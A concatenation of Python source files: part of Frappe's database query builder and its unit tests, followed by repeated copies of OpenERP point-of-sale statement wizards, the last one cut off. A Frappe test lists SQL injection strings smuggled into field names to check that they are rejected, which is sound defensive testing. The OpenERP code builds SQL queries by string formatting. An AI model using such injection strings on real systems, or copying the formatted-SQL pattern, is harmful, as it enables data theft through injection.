			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt
from __future__ import unicode_literals

import frappe, unittest

from frappe.model.db_query import DatabaseQuery
from frappe.desk.reportview import get_filters_cond

class TestReportview(unittest.TestCase):
	def test_basic(self):
		self.assertTrue({"name":"DocType"} in DatabaseQuery("DocType").execute(limit_page_length=None))

	def test_fields(self):
		self.assertTrue({"name":"DocType", "issingle":0} \
			in DatabaseQuery("DocType").execute(fields=["name", "issingle"], limit_page_length=None))

	def test_filters_1(self):
		self.assertFalse({"name":"DocType"} \
			in DatabaseQuery("DocType").execute(filters=[["DocType", "name", "like", "J%"]]))

	def test_filters_2(self):
		self.assertFalse({"name":"DocType"} \
			in DatabaseQuery("DocType").execute(filters=[{"name": ["like", "J%"]}]))

	def test_filters_3(self):
		self.assertFalse({"name":"DocType"} \
			in DatabaseQuery("DocType").execute(filters={"name": ["like", "J%"]}))

	def test_filters_4(self):
		self.assertTrue({"name":"DocField"} \
			in DatabaseQuery("DocType").execute(filters={"name": "DocField"}))

	def test_in_not_in_filters(self):
		self.assertFalse(DatabaseQuery("DocType").execute(filters={"name": ["in", None]}))
		self.assertTrue({"name":"DocType"} \
				in DatabaseQuery("DocType").execute(filters={"name": ["not in", None]}))

		for result in [{"name":"DocType"}, {"name":"DocField"}]:
			self.assertTrue(result
				in DatabaseQuery("DocType").execute(filters={"name": ["in", 'DocType,DocField']}))

		for result in [{"name":"DocType"}, {"name":"DocField"}]:
			self.assertFalse(result
				in DatabaseQuery("DocType").execute(filters={"name": ["not in", 'DocType,DocField']}))

	def test_or_filters(self):
		data = DatabaseQuery("DocField").execute(
				filters={"parent": "DocType"}, fields=["fieldname", "fieldtype"],
				or_filters=[{"fieldtype":"Table"}, {"fieldtype":"Select"}])

		self.assertTrue({"fieldtype":"Table", "fieldname":"fields"} in data)
		self.assertTrue({"fieldtype":"Select", "fieldname":"document_type"} in data)
		self.assertFalse({"fieldtype":"Check", "fieldname":"issingle"} in data)

	def test_between_filters(self):
		""" test case to check between filter for date fields """
		frappe.db.sql("delete from tabEvent")

		# create events to test the between operator filter
		todays_event = create_event()
		event1 = create_event(starts_on="2016-07-05 23:59:59")
		event2 = create_event(starts_on="2016-07-06 00:00:00")
		event3 = create_event(starts_on="2016-07-07 23:59:59")
		event4 = create_event(starts_on="2016-07-08 00:00:01")

		# if the values are not passed in filters then event should be filter as current datetime
		data = DatabaseQuery("Event").execute(
			filters={"starts_on": ["between", None]}, fields=["name"])

		self.assertTrue({ "name": event1.name } not in data)

		# if both from and to_date values are passed
		data = DatabaseQuery("Event").execute(
			filters={"starts_on": ["between", ["2016-07-06", "2016-07-07"]]},
			fields=["name"])

		self.assertTrue({ "name": event2.name } in data)
		self.assertTrue({ "name": event3.name } in data)
		self.assertTrue({ "name": event1.name } not in data)
		self.assertTrue({ "name": event4.name } not in data)

		# if only one value is passed in the filter
		data = DatabaseQuery("Event").execute(
			filters={"starts_on": ["between", ["2016-07-07"]]},
			fields=["name"])

		self.assertTrue({ "name": event3.name } in data)
		self.assertTrue({ "name": event4.name } in data)
		self.assertTrue({ "name": todays_event.name } in data)
		self.assertTrue({ "name": event1.name } not in data)
		self.assertTrue({ "name": event2.name } not in data)

	def test_ignore_permissions_for_get_filters_cond(self):
		frappe.set_user('test1@example.com')
		self.assertRaises(frappe.PermissionError, get_filters_cond, 'DocType', dict(istable=1), [])
		self.assertTrue(get_filters_cond('DocType', dict(istable=1), [], ignore_permissions=True))
		frappe.set_user('Administrator')

	def test_query_fields_sanitizer(self):
		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
				fields=["name", "issingle, version()"], limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, IF(issingle=1, (select name from tabUser), count(name))"],
			limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, (select count(*) from tabSessions)"],
			limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, SELECT LOCATE('', `tabUser`.`user`) AS user;"],
			limit_start=0, limit_page_length=1)

		self.assertRaises(frappe.DataError, DatabaseQuery("DocType").execute,
			fields=["name", "issingle, IF(issingle=1, (SELECT name from tabUser), count(*))"],
			limit_start=0, limit_page_length=1)

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle", "count(name)"],
			limit_start=0, limit_page_length=1)
		self.assertTrue('count(name)' in data[0])

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle", "locate('', name) as _relevance"],
			limit_start=0, limit_page_length=1)
		self.assertTrue('_relevance' in data[0])

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle", "date(creation) as creation"],
			limit_start=0, limit_page_length=1)
		self.assertTrue('creation' in data[0])

		data = DatabaseQuery("DocType").execute(fields=["name", "issingle",
			"datediff(modified, creation) as date_diff"], limit_start=0, limit_page_length=1)
		self.assertTrue('date_diff' in data[0])

def create_event(subject="_Test Event", starts_on=None):
	""" create a test event """

	from frappe.utils import get_datetime

	event = frappe.get_doc({
		"doctype": "Event",
		"subject": subject,
		"event_type": "Public",
		"starts_on": get_datetime(starts_on),
	}).insert(ignore_permissions=True)

	return event                    

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': "[('id','in'," + str(list_statement) + ")]",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for "%s". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute(""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute("INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute("select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'"%(journal.id, company_id, uid, number))
    #            statement_id = cr.fetchone()[0]
    #            print "statement_id",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': "[('id','in', ["+','.join(map(str,list_statement))+"])]",
            'domain': "[('state','=','open')]",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': "[('id','in'," + str(list_statement) + ")]",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for "%s". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute(""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute("INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute("select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'"%(journal.id, company_id, uid, number))
    #            statement_id = cr.fetchone()[0]
    #            print "statement_id",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': "[('id','in', ["+','.join(map(str,list_statement))+"])]",
            'domain': "[('state','=','open')]",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
